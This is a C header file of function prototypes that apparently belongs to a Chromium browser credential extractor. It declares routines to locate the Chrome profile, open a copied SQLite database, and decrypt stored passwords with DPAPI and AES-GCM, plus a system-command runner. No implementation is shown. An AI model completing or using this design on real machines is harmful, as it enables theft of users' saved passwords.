#pragma once
#include <stdio.h>
#include <Shlobj.h>
#include <wchar.h>
#include <shlwapi.h>
#include <sqlite3.h>
#include <dpapi.h>
#include <bcrypt.h>

#define BYTE_RESULT 100
#define TEXT_RESULT 101

// AES_GCM error handling
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

DWORD get_user_dir(GUID folder_id, PCWSTR browser_location, PWSTR buf_path, PSTR buf_outMsg, WORD buf_outSize);
BOOL dpapi_decrypt(BYTE* encrypted_data, DWORD size_encrypted_data, DATA_BLOB* decrypted_data);
BOOL aesgcm_decrypt(BCRYPT_KEY_HANDLE handle_bcrypt, DWORD offset, BYTE* encrypted_password, int* size_encrypted_datablob, BYTE* iv, DWORD size_iv, BYTE* tag, DWORD size_tag, BYTE** decrypted_byte, PULONG decrypted_byte_size);
BOOL base64_to_byte(PCHAR base64_string, BYTE** byte_string, PDWORD size_byte_string);
BOOL checkSubtring(const CHAR* substring, PCHAR test_string);
BOOL get_file_explorer(PSTR chrome_dir, WIN32_FIND_DATAA* dir_files, HANDLE* dir_handle, PSTR buf_outMsg, WORD buf_outSize);
BOOL open_database(PSTR database_location, void** handle_db, PSTR buf_outMsg, WORD buf_outSize, BOOL open_copied_instance);
BOOL prepare_sql(void* handle_db, void** handle_sql_stmt, const char* sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
BOOL iterate_result(void* handle_sql_stmt);
void* get_result(void* handle_sql_stmt, int index, int type);
int get_result_size(void* handle_sql_stmt, int index);
BOOL close_database(void* handle_db, void* handle_sql_stmt, PSTR buf_outMsg, WORD buf_outSize);
BOOL execute_system(LPCWSTR command);